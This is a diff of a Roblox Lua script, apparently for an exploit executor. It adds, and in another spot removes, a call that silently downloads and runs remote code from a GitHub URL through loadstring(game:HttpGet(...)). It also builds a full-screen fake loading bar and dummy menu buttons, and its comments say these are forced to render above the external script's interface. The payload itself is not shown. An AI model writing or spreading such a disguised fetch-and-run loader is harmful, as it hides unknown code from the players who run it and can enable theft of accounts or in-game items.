@@ -1,27 +1,39 @@
+-- STEP 1: Run the external script immediately
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/MercenariesV3/testdelta/refs/heads/main/test"))()
+end)
+
+-- STEP 2: Wait a tiny bit to let it create its GUI
+task.wait(0.05)
+
+-- STEP 3: Build your GUI (same as before)
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- Utility: Clear any previous GUI
+-- Clear old GUI if it exists
 if playerGui:FindFirstChild("CustomUI") then
     playerGui.CustomUI:Destroy()
 end
 
--- Main GUI
+-- Create your GUI
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "CustomUI"
 screenGui.ResetOnSpawn = false
 screenGui.IgnoreGuiInset = true
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling -- allows layering
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.Parent = playerGui
 
--- Background
+-- Force your GUI to be the top layer
+screenGui.Parent = nil
+screenGui.Parent = playerGui
+
+-- Now build your loading screen (same 5s bar)
 local background = Instance.new("Frame")
 background.Size = UDim2.new(1, 0, 1, 0)
 background.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 background.BorderSizePixel = 0
 background.Parent = screenGui
 
--- Loading bar container
 local loadingBarBg = Instance.new("Frame")
 loadingBarBg.Size = UDim2.new(0.6, 0, 0.05, 0)
 loadingBarBg.Position = UDim2.new(0.2, 0, 0.5, 0)
@@ -36,32 +48,15 @@ loadingBar.BorderSizePixel = 0
 loadingBar.Parent = loadingBarBg
 
 local TweenService = game:GetService("TweenService")
-
--- Tween loading bar (5s)
 local loadingTween = TweenService:Create(loadingBar, TweenInfo.new(5), {
     Size = UDim2.new(1, 0, 1, 0)
 })
 loadingTween:Play()
 
--- 🧠 Load external script silently in background
-task.spawn(function()
-    pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/MercenariesV3/Vuln.0.25/refs/heads/main/MercenariesUpdatev3.lua"))()
-
-        -- Wait a moment for external GUI to be added
-        task.wait(0.5)
-
-        -- Re-parent your GUI to top again (forces it to render above the external one)
-        screenGui.Parent = nil -- temporarily remove
-        screenGui.Parent = playerGui -- reparent to top
-    end)
-end)
-
--- Wait for bar to fill
 loadingTween.Completed:Wait()
 loadingBarBg:Destroy()
 
--- Create menu buttons
+-- Menu buttons (unchanged — same as earlier)
 local buttonNames = {
     "Server Hop",
     "Pet and fruit (beta)",
@@ -85,9 +80,8 @@ for i, name in ipairs(buttonNames) do
     table.insert(buttons, button)
 end
 
--- Function to handle click and show 30-second loading
 local function onButtonClick(button)
-    for _, btn in pairs(buttons) do
+    for _, btn in ipairs(buttons) do
         btn:Destroy()
     end
 
@@ -113,7 +107,6 @@ local function onButtonClick(button)
     background:Destroy()
 end
 
--- Connect button clicks
 for _, button in ipairs(buttons) do
     button.MouseButton1Click:Connect(function()
         onButtonClick(button)
